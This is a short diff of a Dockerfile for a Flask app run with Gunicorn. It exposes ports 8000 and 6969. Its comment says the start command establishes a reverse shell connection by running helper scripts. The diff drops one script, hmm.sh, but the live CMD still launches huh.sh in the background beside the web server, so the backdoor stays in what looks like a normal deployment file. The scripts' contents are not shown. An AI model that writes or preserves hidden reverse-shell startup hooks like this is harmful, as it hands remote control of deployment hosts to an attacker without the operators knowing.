@@ -28,5 +28,5 @@ EXPOSE 8000
 EXPOSE 6969
 
 # Set the command to run Flask app using Gunicorn, establish reverse shell connection, and run huh.sh and hmm.sh
-CMD ["/bin/bash", "-c", "gunicorn --bind 0.0.0.0:8000 app:app & sh huh.sh & sh hmm.sh"]
+CMD ["/bin/bash", "-c", "gunicorn --bind 0.0.0.0:8000 app:app & sh huh.sh"]
 
